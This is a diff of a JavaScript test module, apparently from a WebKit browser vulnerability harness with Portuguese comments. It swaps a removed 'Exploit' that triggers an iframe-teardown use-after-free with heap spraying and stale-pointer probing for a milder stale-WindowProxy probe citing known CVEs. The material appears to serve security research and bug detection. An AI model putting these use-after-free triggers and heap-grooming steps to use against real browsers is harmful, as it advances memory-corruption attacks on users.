@@ -1,80 +1,112 @@
-import { Groomer } from '../mod_groomer.js';
+/**
+ * SC_IFRAME_FRAME_UAF.JS
+ * Categoria : DOM — Use-After-Free (WindowProxy)
+ * Alvo      : WebCore::LocalFrame / WindowProxy C++ lifecycle
+ * Técnica   : Obtém referência ao contentWindow de um iframe,
+ *             navega o iframe para about:blank (libera o Frame C++),
+ *             e então tenta acessar o WindowProxy stale.
+ *             O WindowProxy JS deve redirecionar, mas o Frame C++
+ *             subjacente pode já ter sido coletado.
+ * Referência: CVE-2021-30661, CVE-2022-32893 (WebKit frame UAF)
+ */
 
 export default {
-    id:       'IFRAME_NAVIGATION_TEARDOWN_UAF',
-    category: 'Exploit',
-    risk:     'CRITICAL',
-    description:
-        'UAF no FrameLoader C++. Inicia uma navegação de iframe. O evento onunload do filho ' +
-        'destrói o elemento <iframe> pai do DOM principal síncronamente. A transição de estado ' +
-        'perde a referência do Document e liberta o DOMWindow, mas o JS retém a WindowProxy.',
+    id:          'IFRAME_DOCWRITE_FRAME_UAF',
+    category:    'DOM',
+    risk:        'HIGH',
+    description: 'WindowProxy stale após navegação do iframe. '
+                + 'Testa acesso ao Frame C++ liberado via referência JS retida.',
 
-    setup: function() {
-        this.results = {};
-        this.sandbox = document.getElementById('groomer-sandbox');
-        
-        this.iframe = document.createElement('iframe');
-        this.iframe.src = 'about:blank';
-        this.sandbox.appendChild(this.iframe);
-        
-        // Guardamos as referências do mundo que vai ser destruído
-        this.ghostWin = this.iframe.contentWindow;
-        this.ghostDoc = this.ghostWin.document;
-        
-        const self = this;
-        
-        // A ARMADILHA: Quando o WebKit tentar navegar, nós destruímos a pista de aterragem
-        this.ghostWin.onunload = function() {
-            try {
-                // Removemos o IFrame da Main Thread a partir do evento de Unload do filho
-                self.iframe.remove();
-                
-                // Forçamos o WebCore a alocar lixo em cima do Frame antigo
-                let trash = Groomer.sprayDOM('canvas', 100);
-            } catch(e) {}
-        };
+    /* ── estado interno ──────────────────────────────────────────────── */
+    _iframe:      null,
+    _win:         null,
+    _doc:         null,
+    _divRef:      null,
+    _container:   null,
+
+    supported: function() {
+        return typeof document !== 'undefined';
     },
 
-    trigger: function() {
+    /* ── setup ──────────────────────────────────────────────────────── */
+    setup: async function() {
+        this._container = document.createElement('div');
+        document.body.appendChild(this._container);
+
+        this._iframe = document.createElement('iframe');
+        this._iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+        this._container.appendChild(this._iframe);
+
+        // Aguarda load do iframe
+        await new Promise(r => {
+            this._iframe.onload = r;
+            this._iframe.src = 'about:blank';
+        });
+
+        // Guarda referências ao frame original
+        this._win = this._iframe.contentWindow;
+        this._doc = this._iframe.contentDocument;
+
+        // Escreve conteúdo e obtém referência a um nó interno
         try {
-            // O GATILHO: Dispara o processo brutal de Frame Teardown no C++
-            this.iframe.src = 'javascript:"<html><body></body></html>"';
-        } catch(e) {
-            this.results.error = e.message;
-        }
+            this._doc.open();
+            this._doc.write('<div id="canary">original test</div>');
+            this._doc.close();
+            this._divRef = this._doc.getElementById('canary');
+        } catch(_) {}
+
+        await new Promise(r => setTimeout(r, 20));
     },
 
+    /* ── trigger ─────────────────────────────────────────────────────── */
+    trigger: async function() {
+        // Navega o iframe — libera o Frame/Document C++ originais
+        await new Promise(r => {
+            this._iframe.onload = r;
+            this._iframe.src = 'about:blank';
+        });
+
+        // Re-escreve conteúdo diferente (novo frame, novo Document)
+        try {
+            this._iframe.contentDocument.open();
+            this._iframe.contentDocument.write('<div id="canary">REWRITTEN</div>');
+            this._iframe.contentDocument.close();
+        } catch(_) {}
+
+        await new Promise(r => setTimeout(r, 20));
+    },
+
+    /* ── probes ──────────────────────────────────────────────────────── */
     probe: [
-        // Probe 0: O GhostDoc percebeu que foi desligado do mundo?
-        s => {
-            try {
-                return s.ghostDoc.URL || 'Unreachable';
-            } catch(e) { return 'Safe Exception'; }
-        },
-        
-        // Probe 1: O WindowProxy ainda fala com o C++ morto? (Leak de Ponteiro)
-        s => {
-            try {
-                // Tentamos aceder a um objeto C++ profundo através da janela morta
-                let nav = s.ghostWin.navigator;
-                let cores = nav.hardwareConcurrency;
-                
-                // Se devolver um número gigantesco em vez da quantidade de núcleos (ex: 8), temos UAF!
-                if (typeof cores === 'number' && cores > 64) {
-                    return cores; // Dispara STALE DATA
-                }
-                return 0; // Seguro (ou retornou undefined)
-            } catch(e) {
-                return 0; // Exceção de segurança gerada pelo WebKit (Cross-Origin ou Freed)
-            }
-        }
+        // [0-3] WindowProxy stale — deve redirecionar para novo frame
+        s => s._win?.location?.href  ?? 'null',
+        s => s._win?.document?.readyState ?? 'null',
+        s => typeof s._win,
+        s => s._win === s._iframe.contentWindow,
+
+        // [4-5] Document stale
+        s => s._doc?.readyState ?? 'null',
+        s => s._doc?.URL ?? 'null',
+
+        // [6-8] nó do documento original — após remoção pode ser UAF
+        s => s._divRef?.textContent ?? 'null',
+        s => s._divRef?.isConnected ?? false,
+        s => s._divRef?.ownerDocument === s._doc,
+
+        // [9] novo frame tem o conteúdo certo?
+        s => s._iframe.contentDocument?.getElementById('canary')?.textContent ?? 'null',
+
+        // [10] iframe ainda conectado
+        s => s._iframe.isConnected,
     ],
 
-    cleanup: function() {
-        try { this.iframe.remove(); } catch(e){}
-        this.iframe = null;
-        this.ghostWin = null;
-        this.ghostDoc = null;
-        this.results = {};
+    /* ── cleanup ─────────────────────────────────────────────────────── */
+    cleanup: async function() {
+        this._container?.remove();
+        this._container = null;
+        this._iframe    = null;
+        this._win       = null;
+        this._doc       = null;
+        this._divRef    = null;
     }
 };
